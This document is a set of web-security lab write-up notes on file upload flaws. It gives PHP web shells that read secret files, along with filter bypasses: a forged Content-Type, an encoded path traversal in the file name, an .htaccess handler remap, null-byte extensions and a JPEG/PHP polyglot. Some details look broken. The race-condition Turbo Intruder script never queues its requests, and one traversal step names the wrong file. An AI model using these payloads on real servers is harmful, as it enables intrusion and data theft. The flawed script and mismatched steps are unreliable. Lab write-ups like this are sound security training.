# File Upload Vulnerabilities Labs

## Lab: Remote code execution via web shell upload

### Exploitation

Upload a PHP web shell script:

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Access the uploaded web shell:

```text
/files/avatars/file_read.php
```

---

## Lab: Web shell upload via Content-Type restriction bypass

### Exploitation

Intercept upload request in Burp Suite and change the `Content-Type` header:

```http
Content-Type: image/png
```

---

## Lab: Web shell upload via path traversal

### Analysis & Exploitation

1. Attempt upload with traversal in filename: `filename="../file.php"`
   - Server response: `The file avatars/exploit.php has been uploaded.` This suggests that the server is stripping the directory traversal sequence from the file name.
2. Obfuscate traversal sequence via URL encoding: `..%2ffile.php`
   - Server response confirms bypass: `The file avatars/../file.php has been uploaded`
3. Request the uploaded shell from the parent directory:

```http
GET /files/avatars/../file.php HTTP/2
```

---

## Lab: Web shell upload via extension blacklist bypass

### Exploitation

You need to upload two different files to solve this lab.

1. Upload `.htaccess` file containing:

```apache
AddType application/x-httpd-php .l33t
```

This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.

2. Upload your PHP payload using the configured extension:

```text
exploit: exploit.l33t
```

---

## Lab: Web shell upload via obfuscated file extension

### Exploitation

Bypass extension validation using null byte injection in the filename:

```text
filename="exploit.php%00.jpg"
```

---

## Lab: Remote code execution via polyglot web shell upload

### Exploitation

Create a valid JPEG image file containing embedded PHP code:

```bash
convert -size 100x100 xc:white normal.jpg
cp normal.jpg exploit.php
printf '%s\n' '<?php echo file_get_contents("/home/carlos/secret"); ?>' >> exploit.php
```

---

## Lab: Web shell upload via race condition

### Analysis

The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it is possible to execute the file in the small time-window before it is removed.

### Exploitation

Send the request to Turbo Intruder: **Extensions > Turbo Intruder > Send to turbo intruder**

```python
def queueRequests(target, wordlists): 
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,) 
    request1 = '''<YOUR-POST-REQUEST>''' 
    request2 = '''<YOUR-GET-REQUEST>''' 
    engine.openGate('race1')
    engine.complete(timeout=60) 

def handleResponse(req, interesting): 
    table.add(req)
```
